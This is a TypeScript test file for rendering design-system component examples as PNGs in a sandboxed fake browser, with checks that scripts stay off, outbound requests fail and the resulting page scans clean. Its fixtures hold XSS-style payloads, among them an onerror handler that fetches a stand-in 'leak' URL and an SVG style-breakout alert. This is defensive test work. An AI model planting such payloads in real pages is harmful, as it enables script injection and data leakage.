// Component examples as pictures for the living page (documentation/specs/phase-2-5-technical.md §5.11,
// AD-31, T14), drawn by a fake browser: hostile examples still give one PNG per example and scheme, the
// browser had scripts disabled before it loaded anything, no request left, the page built from the
// pictures passes the scanner, and a cached picture makes the page the same without a browser.

import assert from 'node:assert/strict';
import { readdir } from 'node:fs/promises';
import path from 'node:path';
import { test, type TestContext } from 'node:test';

import { CdpUnavailable, type CdpSession } from '../../../src/service/check/cdp.ts';
import { LIVING_EXAMPLE_HEIGHT_MAX, LIVING_EXAMPLE_WIDTH } from '../../../src/shared/limits.ts';
import type { SystemDetail } from '../../../src/shared/types.ts';
import { createLiveFileSource } from '../../../src/service/bundle.ts';
import { configureLivingExamples, EXAMPLE_CSP, renderExamplePngs, type ExampleDeps, type ExampleShot } from '../../../src/service/systems/living-examples.ts';
import { buildLivingPage, livingSchemes, type LivingExampleShot } from '../../../src/service/systems/living-html.ts';
import { toLivingShot } from '../../../src/service/systems/living-page.ts';
import { scanLivingPage } from '../../../src/service/systems/living-safe.ts';
import { createFakeContext, type FakeContext } from '../../helpers/fake-context.ts';
import { useTmpRoot } from '../../helpers/tmp-root.ts';
import { BOARD_FIXTURE_JSON, boardFixture } from './board-fixture.ts';
import { beforeFirstNavigate, createFakeBrowser, type FakeBrowser } from './fake-cdp.ts';

const HOSTILE: Readonly<Record<string, string>> = {
  script: '<!doctype html><html><head></head><body><button>Go</button><script>document.body.innerHTML = "owned"</script></body></html>',
  onerror: '<!doctype html><body><img src="x.png" alt="" onerror="fetch(\'https://example.com/leak\')"><p>Card</p></body>',
  'remote-img': '<!doctype html><body><img src="https://example.com/track.png" alt=""><p>Chip</p></body>',
  'svg-style': '<!doctype html><body><svg width="40" height="40"><style><img src="x" onerror="alert(1)"></style><circle cx="20" cy="20" r="10"/></svg></body>',
  'css-import': '<!doctype html><head><style>@import url(http://example.com/a.css); p { color: var(--brand); }</style></head><body><p>Imported</p></body>',
  tall: '<!doctype html><body><div class="tall" style="height: 50000px">Very tall</div></body>',
  spinner: '<!doctype html><head><style>@keyframes spin { to { transform: rotate(360deg); } } .s { animation: spin 1s linear infinite; }</style></head><body><div class="s">Spinning</div></body>',
};

const TOKENS = ':root {\n  --brand: #1a73e8;\n}\n@media (prefers-color-scheme: dark) {\n  :root { --brand: #8ab4f8; }\n}\n';

// The fixture lists only its own files, so each example is marked present here (the files are on disk below).
const hostileDetail = (): SystemDetail => {
  const detail = boardFixture({ ...BOARD_FIXTURE_JSON, components: Object.keys(HOSTILE).map((id) => ({ id, name: `Part ${id}`, example: `components/${id}.html` })) });
  return { ...detail, components: detail.components.map((component) => ({ ...component, example: { remote: [] } })) };
};

type Rig = { ctx: FakeContext; systemDir: string; detail: SystemDetail; run: (deps: ExampleDeps) => Promise<ExampleShot[]> };

const rig = async (t: TestContext): Promise<Rig> => {
  const tmp = await useTmpRoot(t, 'dc-living-ex-');
  const systemDir = tmp.at('_systems/acme');
  await tmp.write('_systems/acme/tokens.css', TOKENS);
  for (const [id, html] of Object.entries(HOSTILE)) await tmp.write(`_systems/acme/components/${id}.html`, html);
  const ctx = createFakeContext({ root: tmp.root });
  t.after(() => ctx.dispose());
  const detail = hostileDetail();
  const run = async (deps: ExampleDeps): Promise<ExampleShot[]> => {
    configureLivingExamples(ctx, { settleMs: 0, ...deps });
    return renderExamplePngs(ctx, detail, { schemes: livingSchemes(detail), signal: new AbortController().signal, source: createLiveFileSource(systemDir), id: 'acme', systemDir });
  };
  return { ctx, systemDir, detail, run };
};

const pageOf = (detail: SystemDetail, shots: readonly ExampleShot[]): string => {
  const examples: Record<string, LivingExampleShot[]> = {};
  for (const shot of shots) (examples[shot.component] ??= []).push(toLivingShot(shot));
  return buildLivingPage({ ...detail, logos: [] }, { revision: 3, generatedAt: '2026-11-19T10:00:00.000Z', coverage: detail.coverage, redact: [], examples }).html;
};

/** Every request the pages made was the served document, a `data:`/`about:` URL, or failed. */
const nothingLeft = (fake: FakeBrowser): void => {
  const served = new Set(fake.served.map((doc) => doc.url));
  for (const request of fake.requests) {
    if (served.has(request.url) && request.answer === 'fulfill') continue;
    if (request.answer === 'continue') assert.match(request.url, /^(data|about):/, request.url);
    else assert.equal(request.answer, 'fail', request.url);
  }
  assert.ok(fake.requests.some((request) => request.url.startsWith('https://example.com/') && request.answer === 'fail'), 'the remote picture was asked for and failed');
  assert.ok(fake.requests.some((request) => request.url.startsWith('http://example.com/') && request.answer === 'fail'), 'the @import was asked for and failed');
};

test('hostile examples give one picture per example and scheme, with scripts off and nothing leaving', async (t) => {
  const { detail, run } = await rig(t);
  const fake = createFakeBrowser();
  const shots = await run({ openBrowser: fake.open });

  const ids = Object.keys(HOSTILE);
  assert.equal(shots.length, ids.length * 2);
  for (const id of ids) {
    for (const scheme of ['light', 'dark'] as const) {
      const matching = shots.filter((shot) => shot.component === id && shot.scheme === scheme);
      assert.equal(matching.length, 1, `${id} ${scheme}`);
      assert.ok(matching[0]?.png !== null, `${id} ${scheme} has a picture`);
      assert.equal(matching[0]?.reason, null);
      assert.equal(matching[0]?.width, LIVING_EXAMPLE_WIDTH * 2);
    }
  }

  // Scripts were disabled on the page before its first navigation, and every document was served with the no-script CSP.
  const setup = beforeFirstNavigate(fake);
  assert.ok(setup.includes('Emulation.setScriptExecutionDisabled'));
  assert.ok(setup.indexOf('Fetch.enable') < setup.indexOf('Emulation.setScriptExecutionDisabled'));
  for (const send of fake.sends.filter((candidate) => candidate.method === 'Emulation.setScriptExecutionDisabled')) assert.equal(send.params.value, true);
  assert.equal(fake.served.length, ids.length * 2);
  for (const doc of fake.served) {
    assert.ok(doc.headers.some((header) => header.name === 'content-security-policy' && header.value === EXAMPLE_CSP));
    assert.match(EXAMPLE_CSP, /script-src 'none'/);
    assert.ok(doc.html.includes('animation-play-state: paused !important'), 'animations are held still');
  }
  nothingLeft(fake);

  // A 50 000 px layout is clipped to the height bound.
  const tall = shots.find((shot) => shot.component === 'tall' && shot.scheme === 'light');
  assert.equal(tall?.height, LIVING_EXAMPLE_HEIGHT_MAX * 2);
  assert.equal(tall === undefined ? null : toLivingShot(tall).png?.height, LIVING_EXAMPLE_HEIGHT_MAX);

  // The page carries pictures only: safe, no script, one <img> per shot.
  const html = pageOf(detail, shots);
  assert.deepEqual(scanLivingPage(html).reasons, []);
  assert.ok(!/<script/i.test(html));
  assert.ok(!/onerror\s*=/i.test(html));
  assert.ok(!html.includes('example.com'));
  assert.equal(html.match(/<img src="data:image\/png;base64,/g)?.length, ids.length * 2);
});

test('pictures are cached by content: a second run needs no browser and gives the same page', async (t) => {
  const { detail, run, systemDir } = await rig(t);
  const first = await run({ openBrowser: createFakeBrowser().open });
  const cached = (await readdir(path.join(systemDir, '.chamber', 'living-examples'))).filter((name) => name.endsWith('.png'));
  assert.equal(cached.length, Object.keys(HOSTILE).length * 2);
  const unused = createFakeBrowser({ failStarts: 5 });
  const second = await run({ openBrowser: unused.open });
  assert.equal(unused.opened, 0);
  assert.equal(pageOf(detail, second), pageOf(detail, first));
  assert.equal((await run({ openBrowser: null })).every((shot) => shot.png !== null), true);
});

test('no browser: every picture is no-browser and the page is still made', async (t) => {
  const { detail, run } = await rig(t);
  const shots = await run({ openBrowser: null });
  assert.ok(shots.length > 0);
  for (const shot of shots) assert.deepEqual([shot.png, shot.reason], [null, 'no-browser']);
  const html = pageOf(detail, shots);
  assert.deepEqual(scanLivingPage(html).reasons, []);
  assert.ok(html.includes('Chrome or Edge isn&#39;t available.') || html.includes("Chrome or Edge isn't available."));
});

test('a browser that will not start leaves every picture render-failed', async (t) => {
  const { run } = await rig(t);
  const shots = await run({ openBrowser: createFakeBrowser({ failStarts: 9 }).open });
  for (const shot of shots) assert.deepEqual([shot.png, shot.reason], [null, 'render-failed']);
});

test('a hung example times out; the rest are still drawn', async (t) => {
  const { run } = await rig(t);
  const fake = createFakeBrowser({ hangs: (html) => html.includes('Spinning') });
  const shots = await run({ openBrowser: fake.open, shotTimeoutMs: 200 });
  for (const shot of shots) {
    if (shot.component === 'spinner') assert.deepEqual([shot.png, shot.reason], [null, 'render-failed']);
    else assert.ok(shot.png !== null, `${shot.component} ${shot.scheme}`);
  }
});

test('the batch budget leaves the rest render-failed', async (t) => {
  const { run } = await rig(t);
  let now = 0;
  const shots = await run({
    openBrowser: createFakeBrowser().open,
    budgetMs: 2500,
    clock: () => {
      now += 1000;
      return now;
    },
  });
  const drawn = shots.filter((shot) => shot.png !== null).length;
  assert.ok(drawn > 0 && drawn < shots.length, `${drawn} of ${shots.length}`);
  for (const shot of shots) if (shot.png === null) assert.equal(shot.reason, 'render-failed');
});

test('cancelling while the browser is starting stops the batch: the run\'s signal reaches the launch, and every example reads render-failed', async (t) => {
  const { ctx, systemDir, detail } = await rig(t);
  const controller = new AbortController();
  let seen: AbortSignal | undefined;
  configureLivingExamples(ctx, {
    settleMs: 0,
    openBrowser: (launch) => {
      seen = launch?.signal;
      return new Promise<CdpSession>((_resolve, reject) => {
        launch?.signal?.addEventListener('abort', () => reject(new CdpUnavailable('The launch was cancelled.')), { once: true });
        setTimeout(() => controller.abort(), 10);
      });
    },
  });
  const started = Date.now();
  const shots = await renderExamplePngs(ctx, detail, { schemes: livingSchemes(detail), signal: controller.signal, source: createLiveFileSource(systemDir), id: 'acme', systemDir });
  assert.equal(seen, controller.signal);
  assert.ok(Date.now() - started < 2000);
  assert.ok(shots.length > 0 && shots.every((shot) => shot.png === null));
});
